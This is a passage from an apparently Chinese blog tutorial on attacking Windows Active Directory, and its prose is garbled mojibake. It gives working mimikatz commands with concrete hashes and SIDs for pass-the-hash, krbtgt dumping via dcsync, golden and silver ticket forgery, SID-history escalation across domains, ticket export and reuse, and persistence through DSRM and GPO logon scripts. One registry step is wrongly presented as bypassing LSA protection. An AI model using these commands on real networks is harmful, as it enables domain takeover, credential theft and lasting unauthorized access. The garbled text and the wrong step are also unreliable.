-Domain test.local -Username username -Hash  7ECFFFF0C3548187607A14BAD0F88BB1 -Command <span class="string">&quot;calc.exe&quot;</span> -verbose</span><br></pre></td></tr></table></figure><h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><p>å‘½ä»¤å¦‚ä¸‹ï¼Œè¿™è¾¹è¦æä¸€ç‚¹éœ€è¦åœ¨æœ¬æœºæœ‰ç®¡ç†å‘˜æƒé™ï¼Œè¿˜éœ€è¦å’Œç›®æ ‡ç›¸åŒçš„æ¶æ„ï¼Œè¿™è¾¹ä½¿ç”¨çš„æ˜¯X64ç‰ˆæœ¬çš„mimikatz</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth  /user:administrator /domain:ascotbe.com /ntlm:208976c3facce54a3b6b003fcae5d6dc</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/80.png" alt="image-20200805224842818"></p><p>å®‰è£…KB2871997è¡¥ä¸åï¼Œå¯ä»¥ä½¿ç”¨AES-256å¯†é’¥è¿›è¡Œhashä¼ é€’ï¼š</p><p>æŠ“å–AES-256å¯†é’¥ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::ekeys</span><br><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth   /user:administrator /domain:ascotbe.com /aes256:aes256key</span><br></pre></td></tr></table></figure><h3 id="NTLM-Relay"><a href="#NTLM-Relay" class="headerlink" title="NTLM-Relay"></a>NTLM-Relay</h3><p>è¿™ä¸ªæ„Ÿè§‰æœ‰ç‚¹é¸¡è‚‹ï¼Œé€šè¿‡é’“é±¼æ¥å®ç°çš„ï¼Œå…ˆå å‘åé¢è¦æ˜¯æœ‰éœ€æ±‚åœ¨ç ”ç©¶</p><h3 id="åŸŸä¿¡ä»»-1"><a href="#åŸŸä¿¡ä»»-1" class="headerlink" title="åŸŸä¿¡ä»»"></a>åŸŸä¿¡ä»»</h3><p>å½“å­˜åœ¨å­çˆ¶åŸŸæ—¶ï¼Œé»˜è®¤å…¶æ˜¯åŒå‘ä¿¡ä»»ã€‚å¯ä»¥åˆ©ç”¨sid historyè·¨åŸŸææƒã€‚æµç¨‹å¤§è‡´å¦‚ä¸‹ï¼š</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/104.png" alt="img"></p><p>åˆ©ç”¨å¦‚ä¸‹ï¼Œä½¿ç”¨mimikatzè·å–å­åŸŸçš„Krbtgt Hashï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::lsa  /patch</span><br></pre></td></tr></table></figure><p>å†ä½¿ç”¨powerviewè·å–çˆ¶åŸŸçš„sidï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainComputer  -Domain ascotbe.com</span><br></pre></td></tr></table></figure><p>ç„¶åæ·»åŠ ä¸€ä¸ªsid=519çš„ä¼ä¸šç®¡ç†å‘˜ï¼Œåˆ©ç”¨mimikatzæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden  /user:Administrator /krbtgt:5a1c26831592774a17f70370b8606449 /domain:child.ascotbe.com  /sid:S-1-5-21-1786649982-4053697927-1628754434  /sids:S-1-5-21-4288736272-2299089681-4131927610-519 /ptt</span><br></pre></td></tr></table></figure><h3 id="æ”»å‡»Kerberos"><a href="#æ”»å‡»Kerberos" class="headerlink" title="æ”»å‡»Kerberos"></a>æ”»å‡»Kerberos</h3><p>éº»çœç†å·¥å­¦é™¢ç ”å‘Kerberosåè®®æ¥ä¿æŠ¤é›…å…¸å¨œå·¥ç¨‹ï¼ˆProject Athenaï¼‰æä¾›çš„ç½‘ç»œæœåŠ¡å™¨ã€‚è¿™ä¸ªåè®®ä»¥å¸Œè…Šç¥è¯ä¸­çš„äººç‰©Kerberosï¼ˆæˆ–è€…Cerberusï¼‰å‘½åï¼Œä»–åœ¨å¸Œè…Šç¥è¯ä¸­æ˜¯Hadesçš„ä¸€æ¡å‡¶çŒ›çš„ä¸‰å¤´ä¿å«ç¥çŠ¬ã€‚<strong>åœ¨WindowsåŸŸç¯å¢ƒä¸­,KDCçš„è§’è‰²å¸¸å¸¸ç”±DC(Domain Controller)æ¥æ‹…ä»»</strong>,Kerberosæ˜¯ä¸€ç§<strong>åŸºäºç¥¨æ®çš„è®¤è¯æ–¹å¼</strong>,ç¥¨æ®(Ticket)æ˜¯ç”¨æ¥å®‰å…¨çš„åœ¨è®¤è¯æœåŠ¡å™¨å’Œç”¨æˆ·è¯·æ±‚çš„æœåŠ¡ä¹‹é—´ä¼ é€’ç”¨æˆ·çš„èº«ä»½,åŒæ—¶ä¹Ÿä¼šä¼ é€’ä¸€äº›é™„åŠ ä¿¡æ¯,ç”¨æ¥ä¿è¯ä½¿ç”¨Ticketçš„ç”¨æˆ·å¿…é¡»æ˜¯Ticketä¸­æŒ‡å®šçš„ç”¨æˆ·,<strong>Ticketä¸€æ—¦ç”Ÿæˆ,åœ¨ç”Ÿå­˜æ—¶é—´å†…å¯ä»¥è¢«Clientå¤šæ¬¡ä½¿ç”¨æ¥ç”³è¯·åŒä¸€ä¸ªServerçš„æœåŠ¡(ç¥¨æ®çªƒå–é—®é¢˜)</strong></p><blockquote><p> è¿™é‡Œé¢æ¶‰åŠåˆ°çš„ä¸€äº›åè¯ç¼©å†™</p></blockquote><ul><li>KDC(Key Distribution Center):å¯†é’¥åˆ†å‘ä¸­å¿ƒï¼Œé‡Œé¢åŒ…å«ä¸¤ä¸ªæœåŠ¡ï¼šASå’ŒTGS</li><li>AS(Authentication Server):èº«ä»½è®¤è¯æœåŠ¡</li><li>TGS(Ticket Granting Server):ç¥¨æ®æˆäºˆæœåŠ¡,<strong>è¯¥æœåŠ¡æä¾›çš„ç¥¨æ®ä¹Ÿç§°ä¸º TGS æˆ–è€…å«ç™½é“¶ç¥¨æ®</strong></li><li>TGT(Ticket Granting Ticket):ç”±èº«ä»½è®¤è¯æœåŠ¡æˆäºˆçš„ç¥¨æ®**(é»„é‡‘ç¥¨æ®)**ï¼Œç”¨äºèº«ä»½è®¤è¯ï¼Œå­˜å‚¨åœ¨å†…å­˜ï¼Œé»˜è®¤æœ‰æ•ˆæœŸä¸º10å°æ—¶</li></ul><blockquote><p>é»„é‡‘ç¥¨æ®å’Œç™½é“¶ç¥¨æ®çš„ä¸€äº›åŒºåˆ«</p></blockquote><ul><li><p>è®¿é—®æƒé™ä¸åŒ</p><ol><li>Golden Ticket: ä¼ªé€ TGT,å¯ä»¥è·å–ä»»ä½•KerberosæœåŠ¡æƒé™</li><li>Silver Ticket: ä¼ªé€ TGS,åªèƒ½è®¿é—®æŒ‡å®šçš„æœåŠ¡</li></ol></li><li><p>åŠ å¯†æ–¹å¼ä¸åŒ</p><ol><li>Golden Ticket ç”±Kerberosçš„Hashâ€”&gt; krbtgtåŠ å¯†</li><li>Silver Ticket ç”±æœåŠ¡å™¨ç«¯å¯†ç çš„Hashå€¼â€”&gt; master key åŠ å¯†</li></ol></li><li><p>è®¤è¯æµç¨‹ä¸åŒ</p><ol><li>Golden Ticket çš„åˆ©ç”¨è¿‡ç¨‹éœ€è¦è®¿é—®åŸŸæ§(KDC)</li><li>Silver Ticket å¯ä»¥ç›´æ¥è·³è¿‡ KDC ç›´æ¥è®¿é—®å¯¹åº”çš„æœåŠ¡å™¨</li></ol></li></ul><blockquote><p>Kerberos çš„è®¤è¯è¿‡ç¨‹ç¤ºæ„å›¾</p></blockquote><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/114.png" alt="æ­¤å¤„è¾“å…¥å›¾ç‰‡çš„æè¿°"></p><h4 id="é»„é‡‘ç¥¨æ®"><a href="#é»„é‡‘ç¥¨æ®" class="headerlink" title="é»„é‡‘ç¥¨æ®"></a>é»„é‡‘ç¥¨æ®</h4><p>æ¯ä¸ªç”¨æˆ·çš„Ticketéƒ½æ˜¯ç”±krbtgtçš„å¯†ç Hashæ¥ç”Ÿæˆçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¦‚æœæ‹¿åˆ°äº†krbtgtçš„å¯†ç Hashï¼Œå°±å¯ä»¥éšæ„ä¼ªé€ Ticketäº†ã€‚å®é™…ä¸Šåªè¦æ‹¿åˆ°äº†åŸŸæ§æƒé™ï¼Œåœ¨ä¸Šé¢å°±å¯ä»¥å¾ˆå®¹æ˜“çš„è·å¾—krbtgtçš„Hashå€¼ï¼Œå†é€šè¿‡mimikatzå³å¯ç”Ÿæˆä»»æ„ç”¨æˆ·ä»»ä½•æƒé™çš„Ticketï¼Œä¹Ÿå°±æ˜¯Golden Ticket</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/115.png" alt="img"></p><blockquote><p>åœ¨åŸŸæ§ä¸Šæ‰§è¡Œ</p></blockquote><p>å¯ä»¥ç›´æ¥å¯¼å‡º<strong>krbtgt</strong>è´¦æˆ·ä¿¡æ¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync &#x2F;domain:ascotbe.com &#x2F;user:krbtgt</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/105.png" alt="image-20200808181836535"></p><p>ç„¶åæ‰¾åˆ°å¦‚ä¸‹ä¸‰ä¸ªä¿¡æ¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/domainï¼šascotbe.com</span><br><span class="line">/sid:S-1-5-21-4279882978-2535771031-421163639 <span class="comment">#æœ€åé‚£ä¸ª502ä¸éœ€è¦</span></span><br><span class="line">/aes256:43fcdd535d27dc9644852c123c4581f69b2046754e0809344dc9cad94f64a393</span><br></pre></td></tr></table></figure><blockquote><p>ç”Ÿæˆé»„é‡‘ç¥¨æ®</p></blockquote><p>**Tips:**ç”ŸæˆGolden Ticketä¸ä»…å¯ä»¥ä½¿ç”¨aes256ï¼Œä¹Ÿå¯ç”¨krbtgtçš„NTLM hash</p><p>æ¢å›æˆ‘ä»¬çš„windows 10ï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼ˆæ™®é€šç”¨æˆ·æƒé™å³å¯ï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:ascotbe.com /sid:S-1-5-21-4279882978-2535771031-421163639  /aes256:43fcdd535d27dc9644852c123c4581f69b2046754e0809344dc9cad94f64a393 /user:god /ticket:gold.kirbi</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/106.png" alt="image-20200808183201374"></p><p>ç¥¨æ®åˆ¶ä½œæˆåŠŸï¼Œæ¥ä¸‹æ¥å¯¼å…¥æˆ‘ä»¬çš„é»„é‡‘ç¥¨æ®ï¼Œç„¶åå°±å¯ä»¥è¿ä¸ŠåŸŸæ§äº†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt C:\Users\asc0t6e\Desktop\gold.kirbi</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/107.png" alt="image-20200808183611223"></p><p><strong>Tipsï¼š</strong></p><ol><li>è¿™ç§æ–¹å¼å¯¼å…¥çš„Ticketé»˜è®¤åœ¨20åˆ†é’Ÿä»¥å†…ç”Ÿæ•ˆï¼Œå½“ç„¶ï¼Œå¦‚æœè¿‡æœŸäº†ï¼Œå†æ¬¡pttå¯¼å…¥Golden Ticketå°±å¥½</li><li>å¯ä»¥ä¼ªé€ ä»»æ„ç”¨æˆ·ï¼Œå³ä½¿å…¶ä¸å­˜åœ¨</li><li>krbtgtçš„NTLM hashä¸ä¼šè½»æ˜“æ”¹å˜ï¼Œå³ä½¿ä¿®æ”¹åŸŸæ§ç®¡ç†å‘˜å¯†ç </li></ol><h4 id="ç™½é“¶ç¥¨æ®"><a href="#ç™½é“¶ç¥¨æ®" class="headerlink" title="ç™½é“¶ç¥¨æ®"></a>ç™½é“¶ç¥¨æ®</h4><p>Silver Ticketæ˜¯ä¼ªé€ çš„TGS(Ticket Granting Server)ticketï¼Œæ‰€ä»¥ä¹Ÿå«service ticket</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/108.png" alt="img"></p><blockquote><p>åŸŸæ§ä¸Šæ‰§è¡Œ</p></blockquote><p>åœ¨åŸŸæ§ä¸Šæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤æ¥è·å–åŸŸæ§ä¸»æœºçš„æœ¬åœ°ç®¡ç†å‘˜è´¦æˆ·hash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><p>å¦‚æœè¿è¡Œè¯¥å‘½ä»¤æŠ¥é”™äº†ä¸»è¦åŸå› æ˜¯Windows 8.1 å¼€å§‹ä¸ºLSAæä¾›äº†é¢å¤–çš„ä¿æŠ¤ï¼ˆLSA Protectionï¼‰ï¼Œä»¥é˜²æ­¢è¯»å–å†…å­˜å’Œä¸å—ä¿æŠ¤çš„è¿›ç¨‹æ³¨å…¥ä»£ç ã€‚ä¿æŠ¤æ¨¡å¼è¦æ±‚æ‰€æœ‰åŠ è½½åˆ°LSAçš„æ’ä»¶éƒ½å¿…é¡»ä½¿ç”¨Microsoftç­¾åè¿›è¡Œæ•°å­—ç­¾åã€‚ åœ¨LSA Protectionä¿æŠ¤æ¨¡å¼ä¸‹ï¼Œmimikatzè¿è¡Œ <code>sekurlsa::logonpasswords</code>æŠ“å–å¯†ç ä¼šæŠ¥é”™</p><p>è¿è¡Œå¦‚ä¸‹å‘½ä»¤å³å¯ç»•è¿‡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD <span class="string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Lsa&quot;</span> /v <span class="string">&quot;RunAsPPL&quot;</span> /t REG_DWORD /d <span class="string">&quot;00000001&quot;</span> /f</span><br></pre></td></tr></table></figure><p>ä¸è¿‡è¿™ç§æ–¹æ³•éœ€è¦é‡å¯ç”µè„‘æ‰è¡Œï¼Œæ˜¯ä¸æ˜¯è§‰å¾—è¿™æ ·å¤ªé¸¡è‚‹äº†ï¼Ÿè«æ…Œè¿˜æœ‰ä¸€ä¸ªæ–¹å¼æ¥è¾¾åˆ°ä¼ªé‡å¯çš„æ–¹å¼</p><p>æ‰“å¼€powershellç„¶åæ‰§è¡Œå¦‚ä¸‹ä¸¤æ¡å‘½ä»¤ï¼Œå°±æ˜¯ç»“æŸäº†explorer.exeè¿›ç¨‹åœ¨é‡æ–°å¯åŠ¨ä»–å³å¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">taskkill /im explorer.exe /f</span><br><span class="line">start c:\windows\explorer.exe</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/109.png" alt="image-20200808185910908"></p><p>è¿™æ ·å°±èƒ½æŠ“åˆ°æ•°æ®äº†</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/110.png" alt="image-20200808190259737"></p><p>ç„¶åæˆ‘ä»¬æ•´ç†ä¸‹æˆ‘ä»¬éœ€è¦çš„æ•°æ®</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/domain:ascotbe.com</span><br><span class="line">/sid:S-1-5-21-4279882978-2535771031-421163639 </span><br><span class="line">/target:WIN-1OUEMJB0766.ascotbe.com</span><br><span class="line">/service:cifs</span><br><span class="line">/rc4:732c27e05330ce4f35f1efc78ecbc42a <span class="comment">#è¿™ä¸ªæ˜¯NTLMçš„å€¼</span></span><br><span class="line">/user:silver <span class="comment">#è¿™ä¸ªå€¼éšæ„</span></span><br></pre></td></tr></table></figure><blockquote><p>åˆ¶ä½œç™½é“¶ç¥¨æ®</p></blockquote><p>æˆ‘ä»¬åˆ‡æ¢åˆ°windows 10ä¸Šé¢è¿è¡Œå¦‚ä¸‹å‘½ä»¤ï¼ˆæ™®é€šæƒé™å³å¯ï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:ascotbe.com /sid:S-1-5-21-4279882978-2535771031-421163639  /target:WIN-1OUEMJB0766.ascotbe.com /service:cifs /rc4:732c27e05330ce4f35f1efc78ecbc42a /user:silver /ptt</span><br></pre></td></tr></table></figure><p>æˆåŠŸåˆ©ç”¨</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/111.png" alt="image-20200808192143902"></p><h4 id="Export-the-ticket"><a href="#Export-the-ticket" class="headerlink" title="Export the ticket"></a>Export the ticket</h4><p>æˆ‘ä»¬ä¹Ÿèƒ½ç›´æ¥æŠŠå†…å­˜ä¸­çš„é»„é‡‘ç¥¨æ®ç›´æ¥æå‡ºæ¥ç”¨ï¼Œè¿™ä¸ªæ—¶æ•ˆåªæœ‰10ä¸ªå°æ—¶</p><blockquote><p>åŸŸæ§ä¸Šè¿è¡Œ</p></blockquote><p>é€šè¿‡mimikatzå¯¼å‡ºå†…å­˜ä¸­çš„Ticket</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::tickets /<span class="built_in">export</span></span><br></pre></td></tr></table></figure><p>ç„¶åå°±ä¼šç”Ÿæˆè¿™ä¸€å †æ–‡ä»¶äº†</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/112.png" alt="image-20200808193145805"></p><blockquote><p>åˆ©ç”¨</p></blockquote><p>æˆ‘ä»¬æŠŠ<code>[0;483d5]-2-0-40e00000-Administrator@krbtgt-ASCOTBE.COM.kirbi</code>è¿™ä¸ªæ–‡ä»¶æ‹·è´åˆ°æˆ‘ä»¬çš„windows 10ä¸Šé¢ï¼Œç„¶åæ‰§è¡Œï¼ˆæ™®é€šæƒé™å³å¯ï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt C:\Users\asc0t6e\Desktop\[0;483d5]-2-0-40e00000-Administrator@krbtgt-ASCOTBE.COM.kirbi</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨æˆåŠŸï¼Œå¥½åƒç¥¨æ®æœ‰ç‚¹å¤š</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/113.png" alt="image-20200808194619665"></p><h4 id="å§”æ´¾"><a href="#å§”æ´¾" class="headerlink" title="å§”æ´¾"></a>å§”æ´¾</h4><p>å å‘æœ‰ç‚¹æ‡µ</p><h2 id="åŸŸç»´æƒ"><a href="#åŸŸç»´æƒ" class="headerlink" title="åŸŸç»´æƒ"></a>åŸŸç»´æƒ</h2><p>å½“æ‹¿ä¸‹åŸŸæ§åï¼Œå¯ä»¥åœ¨åŸŸæ§ä¸Šé¢åšä¸€äº›æ‰‹è„šï¼Œä»¥ä¿è¯åç»­çš„æƒé™ç»´æŒï¼Œç”šè‡³å¯ä»¥ä¿è¯ï¼Œå°±ç®—åŸŸæ§å¯†ç æ”¹äº†ï¼Œæˆ‘ä»¬ä¾ç„¶å¯ä»¥è¿æ¥ã€‚</p><h3 id="DSRM"><a href="#DSRM" class="headerlink" title="DSRM"></a>DSRM</h3><p>è¯¥æ–¹æ³•ç›¸å½“äºé‡ç½®äº†åŸŸæ§æœºå™¨ä¸Šçš„æœ¬åœ°ç®¡ç†å‘˜å¯†ç ã€‚</p><p>DSRMï¼Œç›®å½•æœåŠ¡è¿˜åŸæ¨¡å¼ï¼Œæ˜¯WindowsæœåŠ¡å™¨åŸŸæ§åˆ¶å™¨çš„å®‰å…¨æ¨¡å¼å¯åŠ¨é€‰é¡¹ã€‚DSRMå…è®¸ç®¡ç†å‘˜ç”¨æ¥ä¿®å¤æˆ–è¿˜åŸä¿®å¤æˆ–é‡å»ºæ´»åŠ¨ç›®å½•æ•°æ®åº“ã€‚DSRMè´¦æˆ·å®é™…ä¸Šå°±æ˜¯<strong>Administrator</strong>ï¼Œä¹Ÿå°±æ˜¯åŸŸæ§ä¸Šé¢çš„æœ¬åœ°ç®¡ç†å‘˜è´¦å·ï¼ŒéåŸŸç®¡ç†å‘˜è´¦å·ã€‚å½“å»ºç«‹åŸŸæ§æ—¶ï¼Œä¼šè®©æˆ‘ä»¬è®¾ç½®DSRMå¯†ç </p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/81.png" alt="img"></p><p>æˆ‘ä»¬ç”¨å¦‚ä¸‹å‘½ä»¤åœ¨åŸŸæ§ä¸ŠåŒæ­¥DSRMå¯†ç </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil</span><br><span class="line"><span class="built_in">set</span>  DSRM password</span><br><span class="line">SYNC  FROM DOMAIN ACCOUNT username</span><br><span class="line">Q</span><br><span class="line">Q</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/82.png" alt="image-20200805225934318"></p><p>ç„¶åæˆ‘ä»¬ç”¨mimikatzæŸ¥çœ‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">token::elevate</span><br><span class="line">lsadump::sam</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/83.png" alt="image-20200806201545242"></p><p>å¯ä»¥å‘ç°æ›¿æ¢æˆåŠŸäº†ï¼Œç„¶åå†åœ¨åŸŸæ§ä¸Šæ·»åŠ æ³¨å†Œè¡¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add  <span class="string">&quot;HKLM\System\CurrentControlSet\Control\Lsa&quot;</span> /v  DSRMAdminLogonBehavior /t REG_DWORD /d 2</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/84.png" alt="image-20200806201708182"></p><p>æœ€åæˆ‘ä»¬åˆ‡æ¢åˆ°<strong>Windows 10</strong>ç”¨pthè¿æ¥è¿‡å»</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::pth  /domain:computername /user:Administrator /ntlm:cd572964d4dec965095d4119ec53e0e2</span><br></pre></td></tr></table></figure><blockquote><p>è¿™è¾¹è¦æä¸€å˜´ï¼Œæäº†æˆ‘å¥½ä¹…MMP</p></blockquote><p>è¿™è¾¹çš„<strong>domain</strong>æ˜¯ä½ ç”µè„‘åç§°ï¼Œä¸æ˜¯ç”¨æˆ·åä¹Ÿä¸æ˜¯åŸŸæ§åå¦‚ä¸‹å›¾</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/85.png" alt="image-20200806204101914"></p><p>æœ€ç»ˆæˆ‘ä»¬è¿æ¥ä¸Šäº†ç›®æ ‡</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/86.png" alt="image-20200806204006515"></p><h3 id="GPO"><a href="#GPO" class="headerlink" title="GPO"></a>GPO</h3><p>å½“æˆ‘ä»¬è·å–åˆ°ç®¡ç†å‘˜æƒé™æ—¶ï¼Œå¯ä»¥é€šè¿‡æ·»åŠ ç»„ç­–ç•¥æ‰‹æ®µï¼Œå®ç°ç”¨æˆ·å¼€æœºè‡ªå¯åŠ¨ï¼Œjumboå¸ˆå‚…æ²¡æœ‰æçš„ä¸€ç‚¹æˆ‘æä¸€ä¸‹ï¼Œè¿è¡Œçš„è„šæœ¬éœ€è¦æ”¾åˆ°è®¿é—®å…±äº«ä¸­ï¼Œä¸ç„¶å…¶ä»–æœºå™¨æ²¡åŠæ³•åŠ è½½æˆ‘ä»¬çš„è„šæœ¬çš„</p><p>åŸŸæ§ä¸Šæ‰§è¡Œè¿‡ç¨‹å¦‚ä¸‹ï¼š</p><p>é¦–å…ˆå»ºç«‹å…±äº«</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/87.png" alt="image-20200806214504438"></p><p>å¦‚å›¾æ‰€ç¤ºnetlogonã€sysvol å…±äº«æ–‡ä»¶å¤¹ä¸ºå‡çº§åŸŸæ§å»ºç«‹çš„å…±äº«æ–‡ä»¶å¤¹ã€‚</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/88.png" alt="image-20200806214553597"></p><p>è¿™ä¸¤ä¸ªæ–‡ä»¶å¤¹æœ‰äº›æœºå™¨æ˜¯æ²¡åŠæ³•è®¿é—®çš„ï¼Œæˆ‘ä»¬æ‰“å¼€é«˜çº§å…±äº«è®¾ç½®</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/89.png" alt="image-20200806221953976"></p><p>ç„¶åæŠŠè¿™ä¸‰ä¸ªä½ç½®çš„å¯åŠ¨å…±äº«éƒ½ç»™æ‰“å¼€</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/90.png" alt="image-20200806222101138"></p><p>æ¥ä¸‹æ¥æˆ‘ä»¬åˆ‡æ¢åˆ°Windows10çœ‹å…±äº«æ–‡ä»¶å¤¹</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/91.png" alt="image-20200806222201365"></p><p>å¯ä»¥çœ‹åˆ°å¤šäº†ä¸ªUsersæ–‡ä»¶ï¼Œç„¶åæˆ‘ä»¬åˆ‡æ¢å›windows2008ï¼Œå°†ä¹‹å‰åšå¥½çš„batæ–‡ä»¶å¤åˆ¶åˆ°å¦‚ä¸‹å…±äº«æ–‡ä»¶ç›®å½•ã€‚</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/92.png" alt="image-20200806222315575"></p><p>æˆ‘æ˜¯å¤åˆ¶åˆ°è¿™ä¸ªç›®å½•ä¸‹ï¼Œåªè¦åœ¨è¿™ä¸ªç›®å½•ä¸‹çš„ä»»æ„æ–‡ä»¶å¤¹éƒ½å¯ä»¥ï¼Œæ¥ç€æ‰“å¼€gpmc.msc ï¼Œç¼–è¾‘é»˜è®¤ç»„ç­–ç•¥</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/93.png" alt="image-20200806204517983"></p><p>ç„¶åæ·»åŠ å¯åŠ¨é¡¹</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/94.png" alt="image-20200806204619026"></p><p>ç„¶ååœ¨ç™»å½•ä½ç½®æ·»åŠ è„šæœ¬</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/95.png" alt="image-20200806214935776"></p><p>ç‚¹å‡»æµè§ˆåæŠŠæˆ‘ä»¬å…ˆå…±äº«çš„è·¯å¾„å¤åˆ¶è¿‡å»</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/96.png" alt="image-20200806222454472"></p><p>æ¥ç€ç‚¹å‡»ç¡®å®šå°±å¥½</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/97.png" alt="image-20200806222526281"></p><p>å†æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤å¼ºåˆ¶åˆ·æ–°ç»„ç­–ç•¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpupdate  /force</span><br></pre></td></tr></table></figure><p>é‡å¯Windows10å°±èƒ½çœ‹åˆ°æ‰§è¡Œäº†æˆ‘ä»¬çš„è„šæœ¬ï¼ŒåŒç†è¿˜å¯ä»¥è®¾ç½®powershellè„šæœ¬</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/98.png" alt="image-20200806222804243"></p><p>ä¹Ÿå¯ä»¥æ·»åŠ è®¡åˆ’ä»»åŠ¡</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/99.png" alt="image-20200806220219836"></p><p>å…·ä½“è‡ªå·±è®¾ç½®å³å¯</p><h3 id="SSP"><a href="#SSP" class="headerlink" title="SSP"></a>SSP</h3><p>ã€€SSPï¼ˆSecurity 